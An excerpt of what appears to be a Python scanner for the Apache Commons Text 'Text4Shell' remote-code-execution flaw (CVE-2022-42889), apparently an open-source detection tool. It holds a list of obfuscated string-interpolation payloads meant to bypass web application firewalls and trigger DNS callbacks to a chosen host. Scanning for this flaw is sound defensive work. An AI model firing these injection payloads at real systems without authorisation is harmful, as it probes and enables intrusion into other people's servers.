...
cprint('[•] CVE-2022-42889 - Apache Commons Text RCE Scanner', "green")
cprint('[•] Scanner provided by @securekomodo', "yellow")
...
default_headers = {
    'User-Agent': 'text4shell-scan (https://github.com/CyberRedline/Text4Shell-Scan)',
...
# Currently only testing DNS related payloads
# Future version will include additional payloads

waf_bypass_payloads = ["${${::-d}${::-n}${::-s}:{{callback_host}}}",
                       "${${::-d}ns:{{callback_host}}}",
                       "${${lower:dns}:{{callback_host}}}",
                       "${${lower:${lower:dns}}:{{callback_host}}}",
                       "${${lower:d}${lower:n}${lower:s}:{{callback_host}}}",
                       "${${lower:d}${upper:n}${lower:s}:{{callback_host}}}",
                       "${d${k8s:k5:-N}s:{{callback_host}}}",
                       "${d${k8s:k5:-NS}:{{callback_host}}}",
                       "${${k8s:k5:-D}${k8s:k5:-N}s:{{callback_host}}}",
                       "${${k8s:k5:-D}${k8s:k5:-NS}:{{callback_host}}}",
                       "${d${k8s:k5:-N}${lower:S}:{{callback_host}}}",
                       "${d${${:-l}${:-o}${:-w}${:-e}${:-r}:n}s:{{callback_host}}}"
                       ]
...
def scan_url(url, callback_host):
    ...
    payload = '${dns:%s.%s}' % (parsed_url["host"], callback_host)
    payloads = [payload]
...
def main():
    ...
    cprint("[%] Checking for CVE-2022-42889 Text4Shell RCE.", "magenta")
    for url in urls:
